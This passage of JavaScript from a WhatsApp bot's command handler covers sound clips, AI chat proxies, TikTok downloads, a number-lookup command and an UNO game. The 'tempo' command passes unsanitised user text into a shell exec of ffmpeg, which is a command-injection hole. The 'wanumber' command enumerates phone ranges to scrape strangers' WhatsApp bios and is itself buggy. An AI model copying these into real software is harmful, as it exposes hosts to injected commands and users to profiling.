case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case 'acumalaka':
case 'reza-kecap':
case 'farhan-kebab':
case 'omaga':
case 'kamu-nanya':
case 'anjay':
case 'siuu':
viot = 'https://telegra.ph/file/2c1f6c598eab67b0f8ffa.jpg'
thumb = 'https://telegra.ph/file/2c1f6c598eab67b0f8ffa.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await David.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdReply: {
mediaUrl: 'https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: m})
} else await Finisher.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: m})
break   



    
    
case 'delcase': {
 if (!isCreator) return reply('Only the creator can delete a case..');
 if (!text) return reply('Which case do you want to delete?');

 // Nama file yang akan dimodifikasi
 const namaFile = './message.js';

 // Case yang ingin Anda hapus
 const caseToDelete = `case '${text}':`;

 // Baca isi file
 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('An error occurred while reading the file:', err);
 return reply('An error occurred while reading the file..');
 }
const posisiCase = data.indexOf(caseToDelete);
 if (posisiCase === -1) {
 return reply(`Case '${args}' not found in file.`);
 }

 // Cari posisi break; berikutnya seAlready case
 const posisiBreak = data.indexOf('break;', posisiCase);
 if (posisiBreak === -1) {
 return reply('Could not find "break;" Already case you want to delete.');
 }

 // Potong data untuk deleting case
 const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 console.error('An error occurred while writing the file:', err);
 return reply('An error occurred while writing the file.');
 } else {
 return reply(`Case '${text}' Succeed deleted.`);
 }
 });
 });
    }
 break;    



      case 'tempo': {
        
        if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
        var req = args.join(' ')
        media = await David.downloadAndSaveMediaMessage(quoted, "tempo")
        if (isQuotedAudio) {
          ran = getRandom('.mp3')
          exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            hah = fs.readFileSync(ran)
            David.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            fs.unlinkSync(ran)
          })
        } else if (isQuotedVideo) {
          ran = getRandom('.mp4')
          exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            hah = fs.readFileSync(ran)
            David.sendMessage(from, { video: hah, mimetype: 'video/mp4' }, { quoted: m })
            fs.unlinkSync(ran)
          })
        } else {
          reply("Please send video/audio file only!")
        }
      }
        break;
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
 

case 'diffusion':
try {
 const hua = await fetchJson(`https://skizo.tech/api/sdxl?apikey=${global.skizo}&prompt=${text}`)
let huaa = hua.url

David.sendMessage(m.chat, {image: huaa, caption: `${text}`},{quoted:fsaluran})
} catch (err) {
reply('Error!!!')
}
break

//=================================================//                

case "gpt4": 
if (!text) return reply('What do you want to ask, bro??')
try {
let cct = await fetchJson(`https://widipe.com/gpt4?text=${text}`)
let resq = cct.result
reply(`${resq}`)
} catch (err) {
reply('Website error')
}
break

case 'totalfeature':
 case 'totalfitur': 
 case 'totalcmd': 
 case 'totalcommand': 
reply(`${totalfitur}`)
break


case 'pickupline': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;

        // Fetch a pickup line
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;
            const contributor = response.data.contributor;

            // Send the pickup line
            reply(`*Pickup Line*\n\n💘 ${pickupLine}\n\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ*`);
        } else {
            // Handle unsuccessful response
            reply('Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            reply(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            reply('No response received from the API. Please try again later.');
        } else {
            reply(`An error occurred: ${error.message}`);
        }
    }
    break;
}

case 'rizz': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;

        // Fetch a pickup line
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;
            const contributor = response.data.contributor;

            // Send the pickup line
            reply(`*RIZZ:*\n\n💘 ${pickupLine}\n\n*ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ*`);
        } else {
            // Handle unsuccessful response
            reply('Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            reply(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            reply('No response received from the API. Please try again later.');
        } else {
            reply(`An error occurred: ${error.message}`);
        }
    }
    break;
}


case 'listapks': {
    const apkList = [
        'myapp.apk',
        'anotherapp.apk',
        'coolgame.apk'
    ];
    const apkMessage = apkList.map((apk, index) => `${index + 1}. ${apk.replace('.apk', '')}`).join('\n');
    reply(`*Available APKs:*\n\n${apkMessage}`);
    break;
}



case 'downloadapk': {
    if (!text) return reply(`*Usage*: ${prefix}downloadapk <app_name>\n\nExample: ${prefix}downloadapk myapp`);

    const appName = text.toLowerCase(); // Convert the text to lowercase for consistency

    // Define your GitHub raw content URL for APKs
    const baseUrl = "https://raw.githubusercontent.com/YourUsername/YourRepo/main/";
    const apkUrl = `${baseUrl}${appName}.apk`;

    try {
        // Send a message indicating the file is being fetched
        await David.sendMessage(m.chat, { text: 'Fetching the APK file. Please wait...' });

        // Check if the APK file exists (optional step)
        const axios = require('axios');
        const response = await axios.get(apkUrl, { responseType: 'arraybuffer' });

        // If file exists, send it
        if (response.status === 200) {
            await David.sendMessage(m.chat, {
                document: response.data,
                mimetype: 'application/vnd.android.package-archive',
                fileName: `${appName}.apk`,
                caption: `Here is the APK file for ${appName}.`
            }, { quoted: m });
        }
    } catch (error) {
        console.error('Error fetching APK:', error);
        reply(`*Error*: Unable to fetch the APK for "${appName}". Make sure the file exists.`);
    }
    break;
}



case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
     David.sendImageAsSticker(m.chat, data.url, m, { packname: `${global.packname}`, author: `${global.author}`})
     
     })
break


case "pokedex": case "pokemon-search":
try {
 const url = `https://some-random-api.com/pokemon/pokedex?pokemon=pikachu`;

const response = await fetch(url);

const json = await response.json();

if (!response.ok) {

throw `An error occurred: ${json.error}`;

}

const message = ` *${m2}- Pokemon Search -${m2}*
e> *Name:* ${json.name}
e> *ID:* ${json.id}
e> *Type:* ${json.type}
e> *Abilities:* ${json.abilities}
e> *Height:* ${json.height}
e> *Weight:* ${json.weight}

 *Description:* ${json.description}`;

reply (message)
} catch (e) {
    reply ("broken, find the correct pokemon..")
    }
break


case 'addcase': {
                if (!isCreator) return reply('?')
    if (!text) return ('Add the case you want to input');
const namaFile = './QUEEN_ANITA-V4.js';
const caseBaru = `${text}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('An error occurred while reading the file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Error File:', err);
            } else {
                reply('Success Adding case');
            }
        });
    } else {
        reply('Failed to Add case');
    }
});

}
break;
case 'ai-search': {
    if (!text) {
        reply('Please provide a query for AI Search.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/ai-search', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            reply(replyMessage);
        } else {
            reply('Failed to get a response from AI Search.');
        }
    } catch (error) {
        console.error('Error fetching from AI Search API:', error);
        reply('An error occurred while connecting to AI Search. Please try again later.');
    }
    break;
}


case 'flux': case 'text2img': case 'textimg': case 'dalle': case 'magicstudio': {
    if (!text) {
        reply('Please provide a prompt.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/magicstudio', {
            params: { prompt: text },
            responseType: 'arraybuffer' // Ensures we handle the image data properly
        });

        const imageBuffer = Buffer.from(response.data, 'binary');

        // Send the image to the user
        await David.sendMessage(m.chat, { image: imageBuffer, caption: `𝐐𝐔𝐄𝐄𝐍_𝐀𝐍𝐈𝐓𝐀-𝐕𝟒` });
    } catch (error) {
        console.error('Error fetching from MagicStudio API:', error);
        reply('An error occurred while generating the image. Please try again later.');
    }
    break;
}


case 'checkgc': {

let getGroups = await David.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *LIST OF GROUP BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await David.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
reply(teks + `*Please Copy the Group ID Above*`)
}
break


case 'wanumber': case 'searchnumber': case 'searchno': case 'searchnumber':{
           	if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 234704375957x`)
var inputnumber = text.split(" ")[0]
        
        reply('`Searching for WhatsApp account in given range...`')
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
            } else if (random_length == 2) {
                random21 = `${status1}${status2}`
            } else if (random_length == 3) {
                random21 = `${status1}${status2}${status3}`
            } else if (random_length == 4) {
                random21 = `${status1}${status2}${status3}${dom4}`
            }
            
            try {
                try {
                    var anu1 = await David.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
                if (anu1 == '401' || anu1.status.length == 0) {
                    nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
                } else {
                    text66 += `🪀 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n 🎗️*Bio :* ${anu1.status}\n🧐*Last update :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
                }
            } catch {
                nowhatsapp += `${number0}${i}${number1}\n`
            }
        }
        reply(`${text66}${nobio}${nowhatsapp}`)
        }
break

case 'llama': {
    if (!text) {
        reply('Please Ask Llama AI Anything.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/llama', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            reply(replyMessage);
        } else {
            reply('Failed to get a response from Llama AI.');
        }
    } catch (error) {
        console.error('Error fetching from Llama API:', error);
        reply('An error occurred while connecting to Llama AI. Please try again later.');
    }
    break;
}





case 'tomoe': case 'gagbot': case 'ragbot': case 'smart': case 'deegreeguru': case 'chatgpt4o': case 'gpt4o': {
    if (!text) {
        reply('Hey, Ask Me Anything 😉.');
        return;
    }

    // Generate a random userId
    const generateRandomUserId = (length) => {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < length; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    };

    const randomUserId = generateRandomUserId(8); // Create a random userId with 8 characters

    try {
        const response = await axios.get('https://bk9.fun/ai/GPT4o', {
            params: { q: text, userId: randomUserId }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            reply(replyMessage);
        } else {
            reply('Failed to get a response from Api.');
        }
    } catch (error) {
        console.error('Error:', error);
        reply('An error occurred.');
    }
    break;
}

case 'gemini': {
    if (!text) {
        reply('Please provide a query for Gemini AI.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/acloudai', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            reply(replyMessage);
        } else {
            reply('Failed to get a response from Gemini AI.');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        reply('An error occurred while connecting to Gemini AI. Please try again later.');
    }
    break;
}



case 'gemini2': {
    if (!text) {
        reply('Please provide a query for Gemini AI.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/gemini', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            reply(replyMessage);
        } else {
            reply('Failed to get a response from Gemini AI.');
        }
    } catch (error) {
        console.error('Error fetching from Gemini API:', error);
        reply('An error occurred while connecting to Gemini AI. Please try again later.');
    }
    break;
}

case 'anita-ai': {
    if (!text) {
        reply('Hello! How can I assist you today with your content needs?...Talk To me, Lets Discuss.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/jeeves-chat2', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            reply(replyMessage);
        } else {
            reply('Failed to get a response from Anita Chat AI.');
        }
    } catch (error) {
        console.error('Error fetching from Anita-Ai API:', error);
        reply('An error occurred while connecting to Anita Server. Please try again later.');
    }
    break;
}


      
        case 'blackbox': case 'chatgpt4': {
    if (!text) {
        reply('Please Ask Me Anything!.');
        return;
    }

    try {
        const userId = m.sender; // Use the sender's ID as the userId
        const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(text)}&userId=${encodeURIComponent(userId)}`;

        // Fetch response from the API
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        // Check if the API returned a valid response
        if (jsonData.status && jsonData.BK9) {
            reply(jsonData.BK9); // Send the AI's response
        } else {
            reply('Failed to fetch response from ApI. Please try again later.');
        }
    } catch (error) {
        console.error('Error fetching ApI response:', error);
        reply('An error occurred while fetching the AI response. Please try again later.');
    }
    break;
}

case 'gpt4': {
    if (!text) {
        reply('Ask Me Anything ^_^');
        return;
    }

    try {
        const userId = m.sender; // Use the sender's ID as the userId
        const apiUrl = `https://bk9.fun/ai/GPT-4?q=${encodeURIComponent(text)}&userId=${encodeURIComponent(userId)}`;

        // Fetch response from the API
        const response = await fetch(apiUrl);
        const jsonData = await response.json();

        // Check if the API returned a valid response
        if (jsonData.status && jsonData.BK9) {
            reply(jsonData.BK9); // Send the AI's response
        } else {
            reply('Failed to fetch response from ChatGPT-4. Please try again later.');
        }
    } catch (error) {
        console.error('Error fetching ChatGPT-4 response:', error);
        reply('An error occurred while fetching the AI response. Please try again later.');
    }
    break;
}

 
   case 'tiktok':
case 'tt': case 'tiktokdl': {
    if (!text) return reply(`*Example*: ${prefix + command} <URL or Link>`);

    try {
        // Notify the user that the bot is processing the request
        await David.sendMessage(m.chat, { react: { text: `⏳`, key: m?.key } });

        // Fetch video data from the TikTok API
        const response = await axios.get(`https://api.siputzx.my.id/api/tiktok`, {
            params: { url: text }
        });

        const { status, data } = response.data;

        if (status && data && data.urls.length > 0) {
            const videoUrl = data.urls[0]; // Use the first available download link
            const videoTitle = data.type || "TikTok Video";

        await David.sendMessage(m?.chat, { react: { text: `📥`, key: m?.key } });
            
            

            // Send the video as a normal video message
            await David.sendMessage(m.chat, {
                video: { url: videoUrl },
                mimetype: 'video/mp4',
                caption: `\n> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ`
            }, { quoted: m });
            await David.sendMessage(m?.chat, { react: { text: `✅`, key: m?.key } });
        } else {
            reply(`*❌ Failed to fetch the TikTok video. Please check the URL and try again.*`);
        }
    } catch (error) {
        console.error("Error in TikTok Downloader:", error);
        reply(`*An error occurred while downloading the TikTok video.*`);
    }
    break;
}


     

case 'is': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} she a virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ™'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./anitav3.jpg') }, { upload: David.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await David.relayMessage(m.chat, msgs.message, {})
            }
            break 
 
case "uno":
{
    if (!m.isGroup) {
        return reply("This command can only be used in group chats.");
    }
   const games = readUnoGameData();
    const args = text.split(' ');
    const command = args[0];
    const subCommand = args.slice(1).join(' ');

    if (!games[m.chat]) {
        games[m.chat] = {
            players: [],
            deck: createDeck(),
            discardPile: [],
            currentPlayer: 0,
            direction: 1,
            currentCard: null,
            drawStack: 0,
            blockCardPlayed: false,
            reverseCardPlayed: false,
            stopVotes: new Set(),
            awaitingColorChoice: false
        };
        writeUnoGameData(games);
        return reply("UNO game started! Type 'uno join' to join.");
    }

    const game = games[m.chat];

    switch (command) {
        case "join":
            if (game.players.find(player => player.id === m.sender)) {
                return reply("You have already joined the game.");
            }
            game.players.push({ id: m.sender, hand: [] });
            writeUnoGameData(games);
            return reply("You have joined the UNO game!");

        case "start":
            if (game.players.length < 2) {
                return reply("At least 2 players are required to start the game.");
            }
            game.deck = shuffle(game.deck);
            game.players.forEach(player => {
                for (let i = 0; i < 7; i++) {
                    player.hand.push(game.deck.pop());
                }
            });
            game.currentCard = game.deck.pop();
            game.discardPile.push(game.currentCard);
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "info":
            return reply(`
UNO Rules and How to Play:

1. Join the game:
   - Use \`uno join\` to join the game.
   - Use \`uno start\` to start the game after at least 2 players have joined.

2. Draw a card:
   - Use \`uno draw\` to draw a card from the deck. If a special card forces you to draw cards, you will draw all required cards.

3. Play a card:
   - Use \`uno play <card_index>\` to play a card. The card must match the color or number of the card on the discard pile, or you can use a black card to change the color.
   - Special cards:
     - \`12\`: The next player draws two cards and is skipped.
     - \`14\`: The next player draws four cards and is skipped.
     - \`10\`: The next player is skipped.
     - \`11\`: The play direction is reversed.
     - \`wild13\`: The player chooses a new color.
     - \`wild14\`: The next player draws four cards and is skipped.

4. Skip a turn:
   - Use \`uno pass\` if you cannot or do not want to play a card on your turn.

5. Check your hand:
   - Use \`uno hand\` to see the cards in your hand.

6. Check the card image:
   - Use \`uno card <card_index>\` to check the image of the card in your hand.

7. End the game:
   - The first player to use all their cards wins the game.

8. Stop the game:
   - Use \`uno stop\` to request to stop the game. All players must agree, or an admin/creator can stop the game directly.
`);

        case "stop":
            const player = game.players.find(p => p.id === m.sender);
            if (!player) {
                return reply("You have not joined the game.");
            }

            if (isAdmins || isCreator) {
                delete games[m.chat];
                writeUnoGameData(games);
                return reply("UNO game stopped by admin/creator.");
            }

            game.stopVotes.add(m.sender);
            if (game.stopVotes.size === game.players.length) {
                delete games[m.chat];
                writeUnoGameData(games);
                return reply("UNO game stopped with all players' agreement.");
            }

            writeUnoGameData(games);
            return reply(`Stop request accepted. ${game.players.length - game.stopVotes.size} more players need to agree.`);

        case "hand":
            const playerHand = game.players.find(p => p.id === m.sender);
            if (!playerHand) {
                return reply("You have not joined the game.");
            }
            const hand = playerHand.hand.map((card, index) => `${index}: ${card.color} ${card.value}`).join("\n");
            const iniHandText = `*Uno Game LorenzoCheems*\n_still under construction_\n\nYour Cards:\n${hand}`;
            await David.sendMessage(m.sender, { text: iniHandText }, { quoted: m });
            return reply('Check your cards!');

        case "card":
            const cardIndex = parseInt(subCommand);
            if (isNaN(cardIndex) || cardIndex < 0 || cardIndex >= game.players.find(p => p.id === m.sender).hand.length) {
                return reply("Invalid card.");
            }
            const card = game.players.find(p => p.id === m.sender).hand[cardIndex];
            const cardImageUrl = getCardImageUrl(card);
            const cardText = `${card.color} ${card.value}`;
            await David.sendMessage(m.sender, { image: { url: cardImageUrl }, caption: cardText }, { quoted: m });
            return reply('Card image sent!');

        case "play":
            const currentPlayer = game.players[game.currentPlayer];
            if (currentPlayer.id !== m.sender) {
                return reply("It's not your turn!");
            }

            const playCardIndex = parseInt(subCommand);
            if (isNaN(playCardIndex) || playCardIndex < 0 || playCardIndex >= currentPlayer.hand.length) {
                return reply("Invalid card.");
            }

            const playCard = currentPlayer.hand[playCardIndex];
            if (!isValidPlay(game.currentCard, playCard)) {
                return reply("The card cannot be played.");
            }

            if (playCard.value === "12") {
                game.drawStack += 2;
            } else if (playCard.value === "wild14") {
                if (hasPlayableCard(currentPlayer, game.currentCard)) {
                    return reply("The Wild Draw Four card can only be played if you have no matching card.");
                }
                game.drawStack += 4;
                game.currentCard.color = "black";
                game.awaitingColorChoice = true;
            } else if (playCard.value === "10") {
                game.currentPlayer = getNextPlayer(game);
            } else if (playCard.value === "11") {
                game.direction *= -1;
            }

            game.currentCard = playCard;
            game.discardPile.push(playCard);
            currentPlayer.hand.splice(playCardIndex, 1);

            if (currentPlayer.hand.length === 0) {
                delete games[m.chat];
                writeUnoGameData(games);
                return reply(`Player ${m.sender} wins!`);
            }

            game.currentPlayer = getNextPlayer(game);
            game.reverseCardPlayed = false;
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "pass":
            const passPlayer = game.players[game.currentPlayer];
            if (passPlayer.id !== m.sender) {
                return reply("It's not your turn!");
            }
            game.currentPlayer = getNextPlayer(game);
            game.reverseCardPlayed = false;
            writeUnoGameData(games);
            return sendGameStatus(m.chat);

        case "color":
    if (!game.awaitingColorChoice || game.players[game.currentPlayer].id !== m.sender) {
        return reply("No color needs to be selected at this time.");
    }

    const chosenColor = subCommand.trim().toLowerCase();
    if (!["red", "yellow", "green", "blue"].includes(chosenColor)) {
        return reply("Invalid color. Choose one of: red, yellow, green, blue.");
    }

    game.currentCard.color = chosenColor;
    game.awaitingColorChoice = false;
    game.currentPlayer = getNextPlayer(game);
    writeUnoGameData(games);
    return sendGameStatus(m.chat);

default:
    return reply("Command not recognized. Use `uno info` to view the list of commands.");
}

function createDeck() {
    const colors = ["red", "yellow", "green", "blue"];
    const values = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12"];
    const deck = [];
    colors.forEach(color => {
        values.forEach(value => {
            deck.push({ color, value });
            if (value !== "1") deck.push({ color, value });
        });
    });
    ["wild13", "wild14"].forEach(value => {
        deck.push({ color: "black", value });
        deck.push({ color: "black", value });
    });
    return shuffle(deck);
}

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}

function isValidPlay(currentCard, playCard) {
    return playCard.color === "black" || currentCard.color === playCard.color || currentCard.value === playCard.value;
}

function getNextPlayer(game) {
    const nextIndex = (game.currentPlayer + game.direction + game.players.length) % game.players.length;
    return nextIndex;
}

function hasPlayableCard(player, currentCard) {
    return player.hand.some(card => isValidPlay(currentCard, card));
}

function getCardImageUrl(card) {
    const baseUrl = "https://raw.githubusercontent.com/abhisheks008/UNO/main/images/";
    if (card.color === "black") {
        return `${baseUrl}${card.value}.png`;
    }
    return `${baseUrl}${card.color}${card.value}.png`;
}

async function sendGameStatus(chat) {
    const currentCardText = `Current Card: ${game.currentCard.color} ${game.currentCard.value}`;
    const currentCardImageUrl = getCardImageUrl(game.currentCard);
    const handsText = game.players.map((player, index) => `${index}: ${player.id} (${player.hand.length} cards)`).join("\n");
    const iniGameStatusText = `*Uno Game*\n\n${currentCardText}\nTurn: ${game.players[game.currentPlayer].id}\n\nPlayer Cards:\n${handsText}`;
    
    await David.sendMessage(chat, { text: iniGameStatusText });
    await David.sendMessage(chat, { image: { url: currentCardImageUrl }, caption: `Current Card: ${game.currentCard.color} ${game.currentCard.value}` });
}
}
break
case "giveaway": {
   const args = text.split(' ');
    const subCommand = args[0];
    const subArgs = args.slice(1).join(' ');

    if (subCommand === "start") {
        if (!isCreator) {
